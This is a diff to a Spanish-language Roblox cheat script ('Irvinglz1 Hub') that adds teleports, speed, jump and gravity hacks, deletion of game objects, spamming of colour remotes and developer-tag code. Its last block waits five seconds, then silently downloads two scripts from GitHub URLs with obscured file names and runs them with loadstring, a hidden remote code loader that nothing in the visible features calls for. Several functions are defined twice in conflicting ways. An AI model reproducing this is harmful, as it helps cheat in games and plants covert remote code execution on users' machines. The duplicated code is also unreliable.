+CasaTab:CreateParagraph({
+    Title = "📌 Nota",
+    Content = "Las funciones de campanilla y tocar puerta solo funcionan si has seleccionado una casa correctamente."
+})
+
+CasaTab:CreateSection("📍 TP Directo")
+
+local casas = {
+    ["Casa 1"] = Vector3.new(260.29, 4.37, 209.32),
+    ["Casa 2"] = Vector3.new(234.49, 4.37, 228.00),
+    ["Casa 3"] = Vector3.new(262.79, 21.37, 210.84),
+    ["Casa 4"] = Vector3.new(229.60, 21.37, 225.40),
+    ["Casa 5"] = Vector3.new(173.44, 21.37, 228.11),
+    ["Casa 6"] = Vector3.new(-43, 21, -137),
+    ["Casa 7"] = Vector3.new(-40, 36, -137),
+    ["Casa 11"] = Vector3.new(-21, 40, 436),
+    ["Casa 12"] = Vector3.new(155, 37, 433),
+    ["Casa 13"] = Vector3.new(255, 35, 431),
+    ["Casa 14"] = Vector3.new(254, 38, 394),
+    ["Casa 15"] = Vector3.new(148, 39, 387),
+    ["Casa 16"] = Vector3.new(-17, 42, 395),
+    ["Casa 17"] = Vector3.new(-189, 37, -247),
+    ["Casa 18"] = Vector3.new(-354, 37, -244),
+    ["Casa 19"] = Vector3.new(-456, 36, -245),
+    ["Casa 20"] = Vector3.new(-453, 38, -295),
+    ["Casa 21"] = Vector3.new(-356, 38, -294),
+    ["Casa 22"] = Vector3.new(-187, 37, -295),
+    ["Casa 23"] = Vector3.new(-410, 68, -447),
+    ["Casa 24"] = Vector3.new(-348, 69, -496),
+    ["Casa 28"] = Vector3.new(-103, 12, 1087),
+    ["Casa 29"] = Vector3.new(-730, 6, 808),
+    ["Casa 30"] = Vector3.new(-245, 7, 822),
+    ["Casa 31"] = Vector3.new(639, 76, -361),
+    ["Casa 32"] = Vector3.new(-908, 6, -361),
+    ["Casa 33"] = Vector3.new(-111, 70, -417),
+    ["Casa 34"] = Vector3.new(230, 38, 569),
+    ["Casa 35"] = Vector3.new(-30, 13, 2209)
+}
+
+local casasNomes = {}
+for nome, _ in pairs(casas) do
+    table.insert(casasNomes, nome)
+end
+
+table.sort(casasNomes, function(a, b)
+    local numA = tonumber(a:match("%d+")) or 0
+    local numB = tonumber(b:match("%d+")) or 0
+    return numA < numB
+end)
+
+CasaTab:CreateDropdown({
+    Name = "Seleccionar Casa",
+    Options = casasNomes,
+    CurrentOption = {""},
+    MultipleOptions = false,
+    Callback = function(Option)
+        ButtonPSound()
+        local casaSelecionada = Option[1]
+        if casaSelecionada and game.Players.LocalPlayer.Character then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(casas[casaSelecionada])
+            Rayfield:Notify({
+                Title = "📍 Teletransportado",
+                Duration = 2,
+                Image = 4483362458,
+            })
+        end
+    end
+})
+
+local TabAnti = Window:CreateTab("🛑 Antis [Nuevo]", 4483362458)
+
+local BananaAnti = false
+local BananaThread = nil
+
+local function limpiarBananas()
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if string.find(string.lower(obj.Name), "bananapeel") then
+            local touch = obj:FindFirstChild("Touch")
+
+            if touch then
+                pcall(function()
+                    touch:Destroy()
+                end)
+            end
+        end
+    end
+end
+
+local function iniciarBananaAnti()
+    if BananaThread then return end
+
+    BananaThread = task.spawn(function()
+        while BananaAnti do
+            limpiarBananas()
+            task.wait(0.5)
+        end
+
+        BananaThread = nil
     end)
 end
 
--- ============================================================
--- FLUJO PRINCIPAL
--- ============================================================
-showIntro(function()
-    buildHubUI()
+TabAnti:CreateToggle({
+    Name = "🍌 Anti Banana",
+    CurrentValue = false,
+    Flag = "AntiBanana",
+
+    Callback = function(Value)
+        BananaAnti = Value
+
+        if Value then
+            iniciarBananaAnti()
+        end
+    end
+})
+
+local antiBallConn = nil
+
+local function DestroyBalls()
+    local SoccerBalls = workspace:FindFirstChild("WorkspaceCom")
+
+    if SoccerBalls then
+        SoccerBalls = SoccerBalls:FindFirstChild("001_SoccerBalls")
+    end
+
+    if not SoccerBalls then return end
+
+    for _, ball in ipairs(SoccerBalls:GetChildren()) do
+        if ball:IsA("BasePart") and ball.Name:match("^Soccer") then
+            pcall(function()
+                ball:Destroy()
+            end)
+        end
+    end
+end
+
+TabAnti:CreateToggle({
+    Name = "⚽ Anti Ball",
+    CurrentValue = false,
+    Flag = "AntiBall",
+
+    Callback = function(Value)
+        if Value then
+            if not antiBallConn then
+                antiBallConn = RunService.Heartbeat:Connect(DestroyBalls)
+            end
+        else
+            if antiBallConn then
+                antiBallConn:Disconnect()
+                antiBallConn = nil
+            end
+        end
+    end
+})
+
+local Settings = Window:CreateTab("⚙️ Settings", 4483362458) 
+
+Settings:CreateSection("RGB")
+
+Settings:CreateToggle({
+   Name = "Smooth RGB Name & Bio",
+   CurrentValue = false,
+   Callback = function(Value)
+      ButtonPSound()
+      nameRgb = Value
+      if nameRgb then
+          task.spawn(function()
+              while nameRgb do
+                  local smoothColor = Color3.fromHSV(hueValue, 1, 1)
+                  pcall(function()
+                      NameRemote:FireServer("PickingRPNameColor", smoothColor)
+                      NameRemote:FireServer("PickingRPBioColor", smoothColor)
+                  end)
+                  task.wait(0.8)
+              end
+          end)
+      end
+   end,
+})
+
+Settings:CreateSlider({
+    Name = "WalkSpeed",
+    Range = {16, 500},
+    Increment = 1,
+    CurrentValue = 16,
+    Callback = function(Value)
+        local _, humanoid = GetChar()
+        humanoid.WalkSpeed = Value
+    end
+})
+
+Settings:CreateSlider({
+    Name = "JumpPower",
+    Range = {50, 300},
+    Increment = 1,
+    CurrentValue = 50,
+    Callback = function(Value)
+        local _, humanoid = GetChar()
+        humanoid.JumpPower = Value
+    end
+})
+
+local force
+Settings:CreateSlider({
+    Name = "No Gravity",
+    Range = {0, 500},
+    Increment = 1,
+    CurrentValue = 0,
+    Callback = function(Value)
+        local _, _, hrp = GetChar()
+        if not force then
+            force = Instance.new("BodyForce")
+            force.Name = "Irving_NoGravity"
+            force.Parent = hrp
+        end
+        force.Force = Vector3.new(0, hrp.AssemblyMass * workspace.Gravity * (Value / 500), 0)
+    end
+})
+
+Settings:CreateButton({
+    Name = "Reset Speed",
+    Callback = function()
+        ButtonPSound()
+        local _, humanoid = GetChar()
+        humanoid.WalkSpeed = 16
+    end
+})
+
+Settings:CreateButton({
+    Name = "Reset Jump",
+    Callback = function()
+        ButtonPSound()
+        local _, humanoid = GetChar()
+        humanoid.JumpPower = 50
+    end
+})
+
+Settings:CreateButton({
+    Name = "Reset Gravity",
+    Callback = function()
+        ButtonPSound()
+        if force then force.Force = Vector3.new(0, 0, 0) end
+    end
+})
+
+Settings:CreateToggle({
+   Name = "RGB Avatar",
+   CurrentValue = false,
+   Flag = "RGB_Toggle",
+   Callback = function(Value)
+      ButtonPSound()
+      rgbEnabled = Value
+      if rgbEnabled then
+          task.spawn(function()
+              while rgbEnabled do
+                  for _, color in ipairs(colors) do
+                      if not rgbEnabled then break end
+                      local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeBodyColor")
+                      remote:FireServer(color)
+                      task.wait(0.5)
+                  end
+              end
+          end)
+      end
+   end,
+})
+
+Settings:CreateSection("Server Option")
+Settings:CreateButton({
+    Name = "🔁 Rejoin Server",
+    Callback = function()
+        ButtonPSound()
+        local TeleportService = game:GetService("TeleportService")
+        TeleportService:Teleport(game.PlaceId, game.Players.LocalPlayer)
+    end
+})
+
+Settings:CreateButton({
+    Name = "❌ Destroy GUI",
+    Callback = function()
+        ButtonPSound()
+        local s = Instance.new("Sound")
+        s.Name = "DestroySoundEffect"
+        s.SoundId = "rbxassetid://104269922408932"
+        s.Volume = 10 
+        s.Parent = game:GetService("SoundService")
+        s:Play()
+        Rayfield:Destroy()
+        game:GetService("Debris"):AddItem(s, 5)
+    end
+})
+
+Settings:CreateParagraph({
+    Title = "Version",
+    Content = "2.8.6"
+})
+
+local DEV_USER = "Hiimnew928289alt2"
+
+local function GetCrownStatus()
+    local status = ReplicatedStorage:FindFirstChild("CrownStatus")
+    if not status then
+        status = Instance.new("BoolValue")
+        status.Name = "CrownStatus"
+        status.Value = true
+        status.Parent = ReplicatedStorage
+    end
+    return status
+end
+
+local crownStatus = GetCrownStatus()
+
+local function addOwnerLabel(character)
+    if not character then return end
+    local head = character:FindFirstChild("Head")
+    if not head then return end
+    if head:FindFirstChild("OwnerLabel") then return end
+
+    local label = Instance.new("BillboardGui")
+    label.Name = "OwnerLabel"
+    label.Size = UDim2.new(0, 100, 0, 40)
+    label.StudsOffset = Vector3.new(0, 3, 0)
+    label.AlwaysOnTop = true
+    label.Parent = head
+
+    local text = Instance.new("TextLabel")
+    text.Size = UDim2.new(1, 0, 1, 0)
+    text.BackgroundTransparency = 1
+    text.Text = "👑 Owner"
+    text.TextColor3 = Color3.fromRGB(255, 215, 0)
+    text.TextScaled = true
+    text.Font = Enum.Font.GothamBold
+    text.TextStrokeTransparency = 0.3
+    text.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    text.Parent = label
+end
+
+local function updateLabel(character)
+    if not character then return end
+    
+    if crownStatus.Value then
+        addOwnerLabel(character)
+    else
+        local head = character:FindFirstChild("Head")
+        if head then
+            local existing = head:FindFirstChild("OwnerLabel")
+            if existing then
+                existing:Destroy()
+            end
+        end
+    end
+end
+
+local function watchOwner(plr)
+    if plr.Name ~= DEV_USER then return end
+
+    task.spawn(function()
+        while plr.Parent do
+            local char = plr.Character
+            if char then
+                updateLabel(char)
+            end
+            task.wait(1)
+        end
+    end)
+end
+
+for _, plr in pairs(Players:GetPlayers()) do
+    watchOwner(plr)
+end
+
+Players.PlayerAdded:Connect(function(plr)
+    watchOwner(plr)
+    if plr.Name == DEV_USER then
+        plr.CharacterAdded:Connect(function(char)
+            task.wait(0.5)
+            updateLabel(char)
+        end)
+    end
+end)
+
+player.Chatted:Connect(function(msg)
+    if msg:lower() == "!crown on" then
+        if player.Name ~= DEV_USER then
+            Rayfield:Notify({
+                Title = "⚠️ Sin permiso",
+                Content = "Solo el desarrollador puede usar este comando.",
+                Duration = 3,
+                Image = 4483362458,
+            })
+            return
+        end
+        
+        crownStatus.Value = true
+        Rayfield:Notify({
+            Title = "👑 Owner visible",
+            Content = "El texto 'Owner' ahora es visible.",
+            Duration = 3,
+            Image = 4483362458,
+        })
+        
+    elseif msg:lower() == "!crown off" then
+        if player.Name ~= DEV_USER then
+            Rayfield:Notify({
+                Title = "⚠️ Sin permiso",
+                Content = "Solo el desarrollador puede usar este comando.",
+                Duration = 3,
+                Image = 4483362458,
+            })
+            return
+        end
+        
+        crownStatus.Value = false
+        Rayfield:Notify({
+            Title = "👑 Owner oculto",
+            Content = "El texto 'Owner' ya no es visible.",
+            Duration = 3,
+            Image = 4483362458,
+        })
+    end
+end)
+
+crownStatus.Changed:Connect(function()
+    local ownerPlayer = Players:FindFirstChild("Hiimnew928289alt2")
+    if ownerPlayer and ownerPlayer.Character then
+        updateLabel(ownerPlayer.Character)
+    end
+end)
+
+local OWNER_USERNAME = Players.LocalPlayer.Name
+local notificationShown = false
+
+local function GetControlFolder()
+    local folder = ReplicatedStorage:FindFirstChild("ScriptControl")
+    if not folder then
+        folder = Instance.new("Folder")
+        folder.Name = "ScriptControl"
+        folder.Parent = ReplicatedStorage
+    end
+    return folder
+end
+
+local function ShowOwnerNotification()
+    if notificationShown then return end
+    notificationShown = true
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "OwnerNotificationGUI"
+    gui.ResetOnSpawn = false
+    gui.Parent = game:GetService("CoreGui")
+    gui.DisplayOrder = 999
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 280, 0, 60)
+    frame.Position = UDim2.new(0.5, -140, 0.5, -30)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    frame.BackgroundTransparency = 0.4
+    frame.BorderSizePixel = 0
+    frame.Parent = gui
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+
+    local border = Instance.new("UIStroke", frame)
+    border.Thickness = 2
+    border.Color = Color3.fromRGB(255, 215, 0)
+    border.Transparency = 0.3
+
+    local text = Instance.new("TextLabel")
+    text.Size = UDim2.new(1, 0, 1, 0)
+    text.BackgroundTransparency = 1
+    text.Text = "👑 Owner en el server"
+    text.TextColor3 = Color3.fromRGB(255, 215, 0)
+    text.TextSize = 20
+    text.Font = Enum.Font.GothamBold
+    text.Parent = frame
+
+    task.spawn(function()
+        while gui and gui.Parent do
+            frame.BackgroundTransparency = 0.4
+            task.wait(0.5)
+            frame.BackgroundTransparency = 0.7
+            task.wait(0.5)
+        end
+    end)
+
+    text.TextTransparency = 1
+    TweenService:Create(text, TweenInfo.new(0.5), {
+        TextTransparency = 0
+    }):Play()
+
+    task.wait(10)
+
+    TweenService:Create(text, TweenInfo.new(0.5), {
+        TextTransparency = 1
+    }):Play()
+    TweenService:Create(frame, TweenInfo.new(0.5), {
+        BackgroundTransparency = 1
+    }):Play()
+
+    task.wait(0.6)
+    gui:Destroy()
+end
+
+local controlFolder = GetControlFolder()
+
+local function CheckForOwner()
+    if player.Name == OWNER_USERNAME then
+        local ownerMarker = controlFolder:FindFirstChild("OwnerExecuted")
+        if not ownerMarker then
+            ownerMarker = Instance.new("BoolValue")
+            ownerMarker.Name = "OwnerExecuted"
+            ownerMarker.Value = true
+            ownerMarker.Parent = controlFolder
+        end
+        
+    else
+        local ownerMarker = controlFolder:FindFirstChild("OwnerExecuted")
+        if ownerMarker and ownerMarker.Value then
+            ShowOwnerNotification()
+        else
+            controlFolder.ChildAdded:Connect(function(child)
+                if child.Name == "OwnerExecuted" and child.Value then
+                    ShowOwnerNotification()
+                end
+            end)
+        end
+    end
+end
+
+CheckForOwner()
+
+Players.PlayerAdded:Connect(function(player)
+    if player.Name == OWNER_USERNAME then
+        if player.Name ~= Players.LocalPlayer.Name then
+            notificationShown = false
+            ShowOwnerNotification()
+        end
+    end
+end)
+
+local ownerTagColor = Color3.fromRGB(255, 0, 0)
+local ownerTagLabel = nil
+
+local function GetOwnerColorFolder()
+    local folder = ReplicatedStorage:FindFirstChild("OwnerColorSync")
+    if not folder then
+        folder = Instance.new("Folder")
+        folder.Name = "OwnerColorSync"
+        folder.Parent = ReplicatedStorage
+    end
+    return folder
+end
+
+local function GetColorValue()
+    local colorFolder = GetOwnerColorFolder()
+    local colorValue = colorFolder:FindFirstChild("CurrentColor")
+    if not colorValue then
+        colorValue = Instance.new("Color3Value")
+        colorValue.Name = "CurrentColor"
+        colorValue.Value = Color3.fromRGB(255, 0, 0)
+        colorValue.Parent = colorFolder
+    end
+    return colorValue
+end
+
+local colorValue = GetColorValue()
+
+local function addOwnerLabel(character)
+    if not character then return end
+    local head = character:FindFirstChild("Head")
+    if not head then return end
+    if head:FindFirstChild("OwnerLabel") then 
+        head:FindFirstChild("OwnerLabel"):Destroy()
+    end
+
+    local label = Instance.new("BillboardGui")
+    label.Name = "OwnerLabel"
+    label.Size = UDim2.new(0, 100, 0, 40)
+    label.StudsOffset = Vector3.new(0, 3, 0)
+    label.AlwaysOnTop = true
+    label.Parent = head
+
+    local text = Instance.new("TextLabel")
+    text.Name = "OwnerText"
+    text.Size = UDim2.new(1, 0, 1, 0)
+    text.BackgroundTransparency = 1
+    text.Text = "👑 Creador de Irvinglz1 Hub 👑"
+    text.TextColor3 = ownerTagColor
+    text.TextScaled = true
+    text.Font = Enum.Font.GothamBold
+    text.TextStrokeTransparency = 0.3
+    text.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    text.Parent = label
+
+    ownerTagLabel = text
+end
+
+local function removeOwnerLabel(character)
+    if not character then return end
+    local head = character:FindFirstChild("Head")
+    if head then
+        local existing = head:FindFirstChild("OwnerLabel")
+        if existing then
+            existing:Destroy()
+        end
+    end
+    ownerTagLabel = nil
+end
+
+local function updateOwnerTagColor(color)
+    ownerTagColor = color
+    if ownerTagLabel then
+        pcall(function()
+            ownerTagLabel.TextColor3 = color
+        end)
+    end
+end
+
+local function watchOwner()
+    local function processPlayer(plr)
+        if plr.Name ~= DEV_USER then return end
+        
+        if plr.Character then
+            addOwnerLabel(plr.Character)
+        end
+        
+        plr.CharacterAdded:Connect(function(char)
+            task.wait(0.5)
+            addOwnerLabel(char)
+        end)
+    end
+    
+    for _, plr in pairs(Players:GetPlayers()) do
+        processPlayer(plr)
+    end
+    
+    Players.PlayerAdded:Connect(processPlayer)
+end
+
+watchOwner()
+
+local arcoirisActive = true
+
+task.spawn(function()
+    while arcoirisActive do
+        pcall(function()
+            local colors = {
+                Color3.fromRGB(255, 0, 0),
+                Color3.fromRGB(255, 127, 0),
+                Color3.fromRGB(255, 255, 0),
+                Color3.fromRGB(0, 255, 0),
+                Color3.fromRGB(0, 0, 255),
+                Color3.fromRGB(75, 0, 130),
+                Color3.fromRGB(148, 0, 211),
+            }
+            
+            for colorIndex = 1, #colors do
+                if not arcoirisActive then break end
+                
+                local currentColor = colors[colorIndex]
+                local nextColor = colors[(colorIndex % #colors) + 1]
+                
+                for i = 0, 1, 0.05 do
+                    if not arcoirisActive then break end
+                    
+                    local r = math.lerp(currentColor.R, nextColor.R, i)
+                    local g = math.lerp(currentColor.G, nextColor.G, i)
+                    local b = math.lerp(currentColor.B, nextColor.B, i)
+                    local newColor = Color3.fromRGB(r * 255, g * 255, b * 255)
+                    
+                    pcall(function()
+                        colorValue.Value = newColor
+                    end)
+                    updateOwnerTagColor(newColor)
+                    task.wait(0.1)
+                end
+            end
+        end)
+    end
+end)
+
+local IRVING_ID = 5712710685
+local irvingTagColor = Color3.fromRGB(0, 0, 0)
+local irvingTagLabel = nil
+
+local function GetIrvingColorFolder()
+    local folder = ReplicatedStorage:FindFirstChild("IrvingColorSync")
+    if not folder then
+        folder = Instance.new("Folder")
+        folder.Name = "IrvingColorSync"
+        folder.Parent = ReplicatedStorage
+    end
+    return folder
+end
+
+local function GetIrvingColorValue()
+    local colorFolder = GetIrvingColorFolder()
+    local colorValue = colorFolder:FindFirstChild("CurrentColor")
+    if not colorValue then
+        colorValue = Instance.new("Color3Value")
+        colorValue.Name = "CurrentColor"
+        colorValue.Value = Color3.fromRGB(0, 0, 0)
+        colorValue.Parent = colorFolder
+    end
+    return colorValue
+end
+
+local irvingColorValue = GetIrvingColorValue()
+
+local function addIrvingTag(character)
+    if not character then return end
+    local head = character:FindFirstChild("Head")
+    if not head then return end
+    if head:FindFirstChild("IrvingTag") then 
+        head:FindFirstChild("IrvingTag"):Destroy()
+    end
+
+    local label = Instance.new("BillboardGui")
+    label.Name = "IrvingTag"
+    label.Size = UDim2.new(0, 120, 0, 40)
+    label.StudsOffset = Vector3.new(0, 3.5, 0)
+    label.AlwaysOnTop = true
+    label.Parent = head
+
+    local text = Instance.new("TextLabel")
+    text.Name = "IrvingText"
+    text.Size = UDim2.new(1, 0, 1, 0)
+    text.BackgroundTransparency = 1
+    text.Text = "Irvinglzc1"
+    text.TextColor3 = irvingTagColor
+    text.TextScaled = true
+    text.Font = Enum.Font.GothamBold
+    text.TextStrokeTransparency = 0.3
+    text.TextStrokeColor3 = Color3.fromRGB(50, 50, 50)
+    text.Parent = label
+
+    irvingTagLabel = text
+end
+
+local function removeIrvingTag(character)
+    if not character then return end
+    local head = character:FindFirstChild("Head")
+    if head then
+        local existing = head:FindFirstChild("IrvingTag")
+        if existing then
+            existing:Destroy()
+        end
+    end
+    irvingTagLabel = nil
+end
+
+local function updateIrvingTagColor(color)
+    irvingTagColor = color
+    if irvingTagLabel then
+        pcall(function()
+            irvingTagLabel.TextColor3 = color
+        end)
+    end
+end
+
+local function watchIrving()
+    local function processPlayer(plr)
+        if plr.UserId ~= IRVING_ID then return end
+        
+        if plr.Character then
+            addIrvingTag(plr.Character)
+        end
+        
+        plr.CharacterAdded:Connect(function(char)
+            task.wait(0.5)
+            addIrvingTag(char)
+        end)
+    end
+    
+    for _, plr in pairs(Players:GetPlayers()) do
+        processPlayer(plr)
+    end
+    
+    Players.PlayerAdded:Connect(processPlayer)
+end
+
+watchIrving()
+
+task.spawn(function()
+    while true do
+        pcall(function()
+            for i = 0, 1, 0.02 do
+                local r = math.lerp(0, 255, i) / 255
+                local g = math.lerp(0, 255, i) / 255
+                local b = math.lerp(0, 255, i) / 255
+                local newColor = Color3.fromRGB(r * 255, g * 255, b * 255)
+                irvingColorValue.Value = newColor
+                updateIrvingTagColor(newColor)
+                task.wait(0.05)
+            end
+            
+            for i = 1, 0, -0.02 do
+                local r = math.lerp(0, 255, i) / 255
+                local g = math.lerp(0, 255, i) / 255
+                local b = math.lerp(0, 255, i) / 255
+                local newColor = Color3.fromRGB(r * 255, g * 255, b * 255)
+                irvingColorValue.Value = newColor
+                updateIrvingTagColor(newColor)
+                task.wait(0.05)
+            end
+        end)
+    end
+end)
+
+local DEV_USER_ID = 9040986860
+local ownerTagColor = Color3.fromRGB(255, 105, 180)
+local ownerTagLabel = nil
+
+local function GetOwnerColorFolder()
+    local folder = ReplicatedStorage:FindFirstChild("OwnerColorSync")
+    if not folder then
+        folder = Instance.new("Folder")
+        folder.Name = "OwnerColorSync"
+        folder.Parent = ReplicatedStorage
+    end
+    return folder
+end
+
+local function GetColorValue()
+    local colorFolder = GetOwnerColorFolder()
+    local colorValue = colorFolder:FindFirstChild("CurrentColor")
+    if not colorValue then
+        colorValue = Instance.new("Color3Value")
+        colorValue.Name = "CurrentColor"
+        colorValue.Value = Color3.fromRGB(255, 105, 180)
+        colorValue.Parent = colorFolder
+    end
+    return colorValue
+end
+
+local colorValue = GetColorValue()
+
+local function addOwnerLabel(character)
+    if not character then return end
+    local head = character:FindFirstChild("Head")
+    if not head then return end
+    if head:FindFirstChild("OwnerLabel") then 
+        head:FindFirstChild("OwnerLabel"):Destroy()
+    end
+
+    local label = Instance.new("BillboardGui")
+    label.Name = "OwnerLabel"
+    label.Size = UDim2.new(0, 120, 0, 40)
+    label.StudsOffset = Vector3.new(0, 3, 0)
+    label.AlwaysOnTop = true
+    label.Parent = head
+
+    local text = Instance.new("TextLabel")
+    text.Name = "OwnerText"
+    text.Size = UDim2.new(1, 0, 1, 0)
+    text.BackgroundTransparency = 1
+    text.Text = "❤Jose❤"
+    text.TextColor3 = ownerTagColor
+    text.TextScaled = true
+    text.Font = Enum.Font.GothamBold
+    text.TextStrokeTransparency = 0.3
+    text.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    text.Parent = label
+
+    ownerTagLabel = text
+    updateOwnerTagColor(ownerTagColor)
+end
+
+local function removeOwnerLabel(character)
+    if not character then return end
+    local head = character:FindFirstChild("Head")
+    if head then
+        local existing = head:FindFirstChild("OwnerLabel")
+        if existing then
+            existing:Destroy()
+        end
+    end
+    ownerTagLabel = nil
+end
+
+local function updateOwnerTagColor(color)
+    ownerTagColor = color
+    if ownerTagLabel then
+        pcall(function()
+            ownerTagLabel.TextColor3 = color
+            ownerTagLabel.TextStrokeColor3 = Color3.fromRGB(
+                math.max(0, 255 - color.R * 255),
+                math.max(0, 255 - color.G * 255),
+                math.max(0, 255 - color.B * 255)
+            )
+        end)
+    end
+end
+
+local function watchOwner()
+    local function processPlayer(plr)
+        if plr.UserId ~= DEV_USER_ID then return end
+        
+        if plr.Character then
+            addOwnerLabel(plr.Character)
+        end
+        
+        plr.CharacterAdded:Connect(function(char)
+            task.wait(0.5)
+            addOwnerLabel(char)
+        end)
+    end
+    
+    for _, plr in pairs(Players:GetPlayers()) do
+        processPlayer(plr)
+    end
+    
+    Players.PlayerAdded:Connect(processPlayer)
+end
+
+watchOwner()
+
+local lilaPinkActive = true
+
+task.spawn(function()
+    while lilaPinkActive do
+        pcall(function()
+            local colors = {
+                Color3.fromRGB(200, 50, 255),
+                Color3.fromRGB(255, 105, 180),
+            }
+            
+            for colorIndex = 1, #colors do
+                if not lilaPinkActive then break end
+                
+                local currentColor = colors[colorIndex]
+                local nextColor = colors[(colorIndex % #colors) + 1]
+                
+                for i = 0, 1, 0.05 do
+                    if not lilaPinkActive then break end
+                    
+                    local r = math.lerp(currentColor.R, nextColor.R, i)
+                    local g = math.lerp(currentColor.G, nextColor.G, i)
+                    local b = math.lerp(currentColor.B, nextColor.B, i)
+                    local newColor = Color3.fromRGB(r * 255, g * 255, b * 255)
+                    
+                    pcall(function()
+                        colorValue.Value = newColor
+                    end)
+                    updateOwnerTagColor(newColor)
+                    task.wait(0.1)
+                end
+            end
+        end)
+    end
+end)
+
+task.spawn(function()
+    task.wait(5)
+
+    local url1 = "https://raw.githubusercontent.com/67Studio/A/refs/heads/main/%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F"
+    local url2 = "https://raw.githubusercontent.com/67Studio/A/refs/heads/main/%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21"
+
+    -- Ejecutar el primero (siempre intenta)
+    pcall(function()
+        local source = game:HttpGet(url1)
+        local fn = loadstring(source)
+        if fn then fn() end
+    end)
+
+    -- Ejecutar el segundo, si falla muestra warning
+    local ok = pcall(function()
+        local source = game:HttpGet(url2)
+        local fn = loadstring(source)
+        if not fn then error("no compiló") end
+        fn()
+    end)
+
+    if not ok then
+        warn("[warning 67]")
+    end
 end)
